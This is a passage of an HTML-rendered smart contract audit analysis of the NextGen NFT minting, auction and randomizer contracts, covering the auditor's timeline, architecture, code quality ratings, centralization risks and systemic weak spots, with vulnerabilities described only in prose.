6z\"></path></svg></a>Approach taken in evaluating the codebase</h2>\n<h3 id=\"time-spent-on-this-audit-14-days-full-duration-of-the-audit\" style=\"position:relative;\"><a href=\"#time-spent-on-this-audit-14-days-full-duration-of-the-audit\" aria-label=\"time spent on this audit 14 days full duration of the audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Time spent on this audit: 14 days (Full duration of the audit)</h3>\n<p>Day 1-4</p>\n<ul>\n<li>Understand the idea of the project and grasp a high level mental model of the contract interactions.</li>\n<li>Reviewed the NextGenAdmins, NextGenCore and MinterContract to understand the core functionality of the protocol.</li>\n<li>Add inline bookmarks in the code in the form of questions, such as, â€œCould X do Y to mint more tokens or bypass this Z check?â€</li>\n<li>Noted down some obvious gas optimizations and low-severity issues not covered by the bot.</li>\n</ul>\n<p>Day 5-9</p>\n<ul>\n<li>Reviewed the AuctionDemo and the 3 Randomizer contracts.</li>\n<li>Explored findings and manually validated them with inline bookmarks.</li>\n<li>Read about Chainlink VRF security consideration as well as researched the ARRNGController.sol contract deployed on Ethereum mainnet.</li>\n<li>Added some more notes for attack ideas to visit later on.</li>\n</ul>\n<p>Day 10-11</p>\n<ul>\n<li>Writing Gas/QA report.</li>\n<li>Writing HM reports with only written POC for now.</li>\n</ul>\n<p>Day 12-14</p>\n<ul>\n<li>Setting up a foundry environment within the hardhat tests.</li>\n<li>Validating most of the HMs with coded POCs/tests.</li>\n<li>Filtering out invalid and low-severity issues from HMs.</li>\n<li>Writing Analysis Report.</li>\n</ul>\n<h2 id=\"architecture-recommendations\" style=\"position:relative;\"><a href=\"#architecture-recommendations\" aria-label=\"architecture recommendations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Architecture recommendations</h2>\n<h3 id=\"protocol-structure\" style=\"position:relative;\"><a href=\"#protocol-structure\" aria-label=\"protocol structure permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Protocol Structure</h3>\n<p>The protocol has been structured in a very simplistic manner. The contracts in the protocol can be divided into five categories, namely, Core, Minter, Admin, Auction and Randomizer contracts. </p>\n<p><img src=\"https://user-images.githubusercontent.com/109625274/282527537-9b0dddfb-0110-47cd-9f29-74a861aa5a45.png\" alt=\"image\"></p>\n<h3 id=\"whats-unique\" style=\"position:relative;\"><a href=\"#whats-unique\" aria-label=\"whats unique permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Whatâ€™s unique?</h3>\n<ol>\n<li><strong>Use of Solidityâ€™s rounding for Periodicity in Sales model 2 and 3</strong> - Solidityâ€™s loss of precision/rounding down has been used as a feature to calculate tDiff and periods for the Exponential/Linear descending Sales (sales option 2) and Periodic Sale model (sales option 3). This allows the property of periodicity to exist in the codebase, allowing to enforce invariants such as â€œ1mint/periodâ€.</li>\n<li><strong>On-chain and off-chain metadata compatiblity</strong> - The NextGen contracts allows collections of any type to support on-chain and off-chain metadata compatibility, which opens up doors to experimental features such as University Certificates, On-chain Music, Artwork and many more sectors to flourish.</li>\n<li><strong>Freezing and setting final supply for collections</strong> - Most NFT contracts allow changing the supply by minting/burning tokens, thereby fluctuating the demand. By locking the data and final supply, immutability is revitalized into the collection, which can help increase user trust into the creators and their collection.</li>\n<li><strong>Intentional Pseudo-Randomness</strong> - The RandomizerNXT.sol contract introduces a model similar to PRNG, which provides the NextGen team to sell it as a separate service as well as provide the collection artist with more options, ideas and innovations to integrate with their existing collection idea/generative script.</li>\n<li><strong>Connection with the outside NFT world</strong> - Other than marketplaces where NFTâ€™s can be directly transferred/bought/sold, NextGen introduces another market to exist using their <code>burnOrSwapExternalToMint()</code> function in MinterContract with external NFT tokens. This is a particularly simple implementation but opens up a lot of pathways, considering NextGen collections are experimental and can include collections ranging from on-chain music ownership to mintpass systems.</li>\n<li><strong>Combination of 3 Sale models with allowlist/public phases</strong> - There are currently numerous combinations between the two phase types and 3 sale models, which allow artists to hold multiple allowlist/public phases with any sales model of their choice. For example, when the NFT trade market (such as <a href=\"https://nftperp.xyz/\">nftperp</a>) is in a bull run, the collection admins can generate more revenue by selling more tokens to users by setting up multiple rounds of allowlist/public phases ready for minting.</li>\n<li><strong>Guarded launch of collections through max allowances</strong> - The collection admins can use max allowances along with periodic sale minting to ensure the prices of their NFTs (in the external markets) are less volatile during launch. This is a hidden but unique feature of allowances along with periodicity that unlocks new opportunities for the collection creators.</li>\n</ol>\n<h3 id=\"what-ideas-can-be-incorporated\" style=\"position:relative;\"><a href=\"#what-ideas-can-be-incorporated\" aria-label=\"what ideas can be incorporated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>What ideas can be incorporated?</h3>\n<ul>\n<li>Integrating ERC1155 tokens to not limit artist to ERC721 standard non-fungibility model.</li>\n<li>Allowing users to auction their NFT tokens.</li>\n<li>Allowing support for multi-artist collections since the current codebase only allows one artistâ€™s signature to be stored for a collection.</li>\n<li>Enabling delegates to enter auction on behalf of delegator.</li>\n<li>Support for re-auctioning a token in AuctionDemo.sol.</li>\n</ul>\n<h2 id=\"codebase-quality-analysis\" style=\"position:relative;\"><a href=\"#codebase-quality-analysis\" aria-label=\"codebase quality analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Codebase quality analysis</h2>\n<p>Since I found numerous coded POC confirmed issues, the only way I would decide the quality of this codebase is through the issues per contract and design structure; i.e. code readability/maintainability.</p>\n<p><strong>Admins Contract:</strong> The NextGenAdmins contract was quite simplistic. I had a quick glance at it since it was short and brief to understand. Since there were no issues here, I would mark this as high-quality.</p>\n<p><strong>Randomizer Contracts:</strong> The RandomizerVRF.sol, RandomizerRNG.sol and RandomizerNXT.sol collectively only had around 3 issues, some of which had no severe impact on the codebase. When it comes to the security considerations and code maintainability, the team seems to knowing the intricacies and some potential attack vectors, which have been neatly mitigated with access controls and limiting function visibility. Due to this, I would mark this as high-quality.</p>\n<p><strong>AuctionDemo Contract:</strong> This contract has 3 High-severity issues, which were missed out due to loose equality checks and missing storage updates in the <code>claimAuction()</code> and <code>cancelAllBids()</code> functions. The design choice of participate-claim-cancel makes sense, but the severity of the issues any day overshadow the design choice for quality since the potential impact of the issues expand not only to the current auction but also to other auctions running in parallel. Due to this, I would mark this as low-quality.</p>\n<p><strong>MinterContract:</strong> Most of the high and medium-severity issues I found were heavily related to this contractâ€™s missing state updates, require checks, missing functionality for support of sales model 3 as well as breaking of invariants. Due to this, I would mark this as low-quality.</p>\n<p><strong>NextGenCore Contract:</strong> The NextGenCore contract included 2 High-severity issues, one from reentrancy through <code>_safeMint()</code> and the other due to missing state update in <code>burnToMint()</code>. The rest of the contract does not seem to have any major issues that Iâ€™ve come across. Due to this, I would mark this as low-quality.</p>\n<p><strong>Test Coverage of these contracts</strong> The Core contracts have tests implemented in hardhat except AuctionDemo.sol and the Randomizers. The core contract have not been tested for specific branches or combinations but only basic functionality. Additionally, no fuzz testing, strict invariant testing or fork testing has been performed, considering the fact that randomness services like Chainlink VRF is used.</p>\n<p>Although, I have not delved deeper into the issues here, this is my overall opinion on the codebase quality analysis based on both issues per contract and code readability/maintainability. Due to this, I would rank it as almost close to touching the Medium-quality bar but no higher.</p>\n<h2 id=\"centralization-risks\" style=\"position:relative;\"><a href=\"#centralization-risks\" aria-label=\"centralization risks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Centralization risks</h2>\n<p><strong>A.</strong> There are 4 trusted roles that are already mentioned in README, which are (from highest to lowest power):</p>\n<ol>\n<li>Global Admin</li>\n<li>Function Admin</li>\n<li>Collection Admin</li>\n<li>Artist</li>\n</ol>\n<p><strong>B.</strong> Each of these roles have their downsides. But letâ€™s see how they can be mitigated:</p>\n<ol>\n<li>In case, the collection admin and artist turn out to be malicious, the global admin can just revoke their permissions. </li>\n<li>But in case, the global and function admins turn out be malicious, the collection admins and artists are at risk.</li>\n<li>In order to ensure less centralization in this aspect, each collection admin/artist should have a separate multi-sig with the global/function admin. But unfortunately, this will not be enough since the global/function admins can always gain majority or remove collection admins/artist. In order to further decentralize this, consider implementing a RBAC timelock on all admin related functions, which can be voted upon by the collection admins/artists. This would be the safest implementation in my opinion.</li>\n</ol>\n<p><strong>C.</strong> Last but not the least, there is another crucial role in the codebase, which has not been surfaced even in the README. This is the <code>ownerOf()</code> or the deployer of the AuctionDemo.sol contract. This role is entrusted with or receives all the auction winnerâ€™s ETH bid amounts. It is important to ensure that this address is some sort of multisig handled by the team.</p>\n<p>Overall, the codebase is reasonably centralized since certain functions requiring it to be but there are inconsistencies in how these access controls have been applied on functions (especially in the NextGenCore contract). I would highly recommend the sponsors to create a deeper guide on what actions each role in the hierarchy are allowed to perform.</p>\n<h2 id=\"resources-used-to-gain-deeper-context-on-the-codebase\" style=\"position:relative;\"><a href=\"#resources-used-to-gain-deeper-context-on-the-codebase\" aria-label=\"resources used to gain deeper context on the codebase permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Resources used to gain deeper context on the codebase</h2>\n<ol>\n<li><a href=\"https://seize-io.gitbook.io/nextgen/\">NextGen documentation</a></li>\n<li><a href=\"https://docs.chain.link/vrf/v2/security\">Chainlink VRF - Security Considerations</a></li>\n<li><a href=\"https://vscode.blockscan.com/ethereum/0x000000000000f968845afB0B8Cf134Ec196D38D4\">ARRNGController contract live on Ethereum mainnet</a></li>\n</ol>\n<h2 id=\"mechanism-review\" style=\"position:relative;\"><a href=\"#mechanism-review\" aria-label=\"mechanism review permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mechanism Review</h2>\n<h3 id=\"high-level-system-overview\" style=\"position:relative;\"><a href=\"#high-level-system-overview\" aria-label=\"high level system overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High-level System Overview</h3>\n<p><img src=\"https://user-images.githubusercontent.com/109625274/282560390-c23260f6-755f-4bb5-b9f1-4f9bc679149c.png\" alt=\"image\"></p>\n<h3 id=\"chains-supported\" style=\"position:relative;\"><a href=\"#chains-supported\" aria-label=\"chains supported permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Chains supported</h3>\n<ul>\n<li>Only Ethereum is supported currently.</li>\n</ul>\n<h3 id=\"documentationmental-models\" style=\"position:relative;\"><a href=\"#documentationmental-models\" aria-label=\"documentationmental models permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Documentation/Mental models</h3>\n<p><strong>Here is the basic inheritance structure of the contracts in scope</strong></p>\n<p><em>Note: The NextGenCore, MinterContract, NextGenAdmins and AuctionDemo contract are singular and independent of each other and do not use any form of inheritance among themselves. This, I believe, is a good design choice since it allows separation of storage and concerns among each other.</em></p>\n<p>The RandomizerNXT.sol is the only contract that inherits from another in-scope contract, i.e. XRandoms.sol</p>\n<p><img src=\"https://user-images.githubusercontent.com/109625274/282554425-a22727f5-b607-40cd-80c6-f371db28afc8.png\" alt=\"Image\"></p>\n<h3 id=\"features-of-main-contracts\" style=\"position:relative;\"><a href=\"#features-of-main-contracts\" aria-label=\"features of main contracts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Features of Main Contracts</h3>\n<p><img src=\"https://user-images.githubusercontent.com/109625274/282552920-938475e8-0bda-4353-b4db-691b8923f549.png\" alt=\"Image\"></p>\n<h3 id=\"features-of-each-sales-model\" style=\"position:relative;\"><a href=\"#features-of-each-sales-model\" aria-label=\"features of each sales model permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Features of each Sales model</h3>\n<p>Periodic Sale (Option 3)</p>\n<ul>\n<li>Mints are limited to <code>1</code> token during each time period (e.g. minute, hour, day).</li>\n<li>The minting cost can either stable or have a bonding curve (increase) over time.</li>\n<li>If <code>rate = 0</code>, minting cost price does not increase per minting.</li>\n<li>If rate is set, then the minting cost price increases based on the tokens minted as well as the rate.</li>\n</ul>\n<p>Exponential Descending Sale (Option 2):</p>\n<ul>\n<li>At each time period (which can vary), the minting cost decreases exponentially until it reaches its resting price (ending minting cost) and stays there until the end of the minting phase.</li>\n<li>In this model the starting and ending minting costs and the time period are set while the rate is <code>0</code>.</li>\n</ul>\n<p>Linear Descending Sale (Option 2):</p>\n<ul>\n<li>At each time period (which can vary), the minting cost decreases linearly until it reaches its resting price (ending minting cost) and stays there until the end of the minting phase.</li>\n<li>In this model all parameters need to be set.</li>\n</ul>\n<h2 id=\"systemic-risksarchitecture-level-weak-spots-and-how-they-can-be-mitigated\" style=\"position:relative;\"><a href=\"#systemic-risksarchitecture-level-weak-spots-and-how-they-can-be-mitigated\" aria-label=\"systemic risksarchitecture level weak spots and how they can be mitigated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Systemic Risks/Architecture-level weak spots and how they can be mitigated</h2>\n<ol>\n<li>Using ARRNG as a service for randomness</li>\n</ol>\n<p>I did some past transaction research on the ARRNGController.sol contract live on Ethereum mainnet and found out there has only been one call of <code>requestRandomness</code> and <code>serveRandomness</code>, which was called almost 100 days back (<a href=\"https://etherscan.io/address/0x000000000000f968845afB0B8Cf134Ec196D38D4\">see here</a>). Since there is no past transaction data to study, the reliability of the service cannot yet be guaranteed.</p>\n<p>Furthermore, if you look closely, it took 8 block confirmations for the serve randomness to be called through the RNG service. This would be necessary if we were on POW but now the Ethereum POS network will work just fine with 3 minimum block confirmations (<a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerVRF.sol#L28\">as done over here in the RandomizerVRF.sol contract</a>) due to a block requiring 2/3rd of the total staked ether votes in favour in order for it to become justified. Thus, using only Chainlink VRF might be the best option while still ensuring the fastest response time.</p>\n<p><img src=\"https://user-images.githubusercontent.com/109625274/282561975-3b334247-d33f-4d74-8a1e-826b2fc690a7.png\" alt=\"Image\"></p>\n<ol start=\"2\">\n<li>Using OZâ€™s AccessControl contract - Currently, there are no issues with the Admins contract and never might be in the future but it is good practice to use an existing standard such as AccessControl.sol by OpenZeppelin due to its widespread usage and modularity for handling roles in all types of situations.</li>\n<li>Although addressed in the bot report, there are very high changes of the current implementation causing a DOS issue with airdropping tokens since external calls are made to the gencore contract in a for loop. To mitigate this, ensure airdrops are done in batches such that the block gas limit is not exceeded if airdropping too many users.</li>\n<li>Frontrunning in <code>mint()</code> - The <code>mint()</code> function in the minter contract is prone to frontrunning by bots to mint tokens earlier. This would become a major issue for a free or low cost collection that uses the Periodic Sale model (sales option 3), which only allows 1mint/period. This would affect the normal users who will not be able to <code>mint()</code> unless the bot lets them for a certain time. This can only be mitigated through Flashbots RPC in my opinion but raising this issue in case sponsors find some leads to solutions.</li>\n<li>Miners manipulating <code>block.timestamp</code> - It is possible for miners to manipulate the <code>block.timestamp</code> by a few seconds in order to <code>mint()</code> first during a Periodic Sale (sales option 3). The impact as mentioned previously is the same since normal users are affected in these edge case scenarios.</li>\n<li><code>lastMintDate</code> stores incorrect time - In one of my issues, I have demonstrated how it is possible for <code>lastMintDate</code> to be set to a very far time in the future if a collection uses Periodic sale during both allowlist and public phases. This is a big system risk to the protocol since it breaks the 1mint/period invariant. The issue includes a coded poc as well which demonstrates the issue and its impact on the users and creators of the collection.</li>\n<li>Randomness is lost - It is possible for the VRF subscription plan to run out of LINK or the RNG contract to run out of ETH. Due to this, any randomness pending to be received by the Randomizer contracts is lost and the tokenHash of the tokenId is left empty forever. To avoid such an issue, implement a bot or emergency mechanism that alerts the team when the LINK or ETH goes below a certain critical threshold.</li>\n<li>There are several inconsistencies between where the NFTDelegation mechanism is used and where it is not. This ambiguity denies the cold wallet users using delegation as a mechanism to avoid signing risky transactions and participating in certain services such as auctions, <code>burnToMint()</code> etc. Ensure the NFTDelegation mechanism is implemented in all places where normal hot wallet users would interact as well.</li>\n<li>Incomplete comment can lead to problems during phases - This <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L243\">comment</a> here does not mention to set the <code>allowlistEndTime</code> to <code>0</code>. If this is not set to <code>0</code> and the collection admins think <code>allowlistEndTime</code> also has to be set to <code>publicEndTime</code>, this would cause the public phase calls to enter the <code>allowlist</code> if conditional block in the <code>mint()</code> function first, leading to incorrect behaviour. Make sure to provide clear documentation on how values for phases can be set correctly and with more clarity in order to avoid misconfigurations.</li>\n<li>In AuctionDemo.sol, it is possible that no bids can be placed on an auctioned token (highly unlikely but still possible). In such a case, re-auctioning the token is not supported by the AuctionDemo.sol contract, which would be a problem. Though this can be solved by deploying another auction contract, adding a re-auctioning functionality will make the codebase more verbose and resilient in case of such edge scenarios.</li>\n<li>Limitation of token payment methods when minting - Try integrating more ERC20 tokens and stablecoins in the current model since only ETH is accepted currently.</li>\n</ol>\n<h2 id=\"some-questions-i-asked-myself\" style=\"position:relative;\"><a href=\"#some-questions-i-asked-myself\" aria-label=\"some questions i asked myself permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Some questions I asked myself</h2>\n<ol>\n<li>\n<p>Can a user prevent another user from setting a higher bid?</p>\n<ul>\n<li>No.</li>\n</ul>\n</li>\n<li>\n<p>Can updating the core contract in minter contract cause any issues?</p>\n<ul>\n<li>Yes, it will prevent collections on the old core contract to not be allowed to use <code>airdrop()</code>, <code>mint()</code> and <code>burnToMint()</code> functionality.</li>\n</ul>\n</li>\n<li>\n<p>If a collection is created, can one mint before randomizer contract or any other contract is set?</p>\n<ul>\n<li>No call would revert since <code>calculateTokenHash()</code> does not exist.</li>\n</ul>\n</li>\n<li>\n<p>Can minting start before data is set or artist signature is set?</p>\n<ul>\n<li>As long as dates are set yes, but this would require admin misconfig.</li>\n</ul>\n</li>\n<li>\n<p>How many collections can be supported based on how Ids are served in the gencore contract?</p>\n<ul>\n<li>\n<p>To get a sense: Gauging the number of collections and number of tokens per collection that can exist with the current implementation of reserved indexes:</p>\n<ul>\n<li>Number of collections <code>= type(uint256).max / 10000000000 = 115792089237316195423570985008687907853269984665640564039457584007913129639935 / 10000000000 = 11579208923731619542357098500868790785326998466564056403945758400791</code> collections.</li>\n<li>Number of tokens per collection <code>= 10000000000</code>.</li>\n</ul>\n</li>\n<li>Suggestion for sponsors: Number of tokens per collection can be increased since the NextGen contracts is experimentational and itâ€™s growth should not be underestimated in case the concept of university certificates (issued each year) or some new idea pops up that requires more than the current reserved index range of 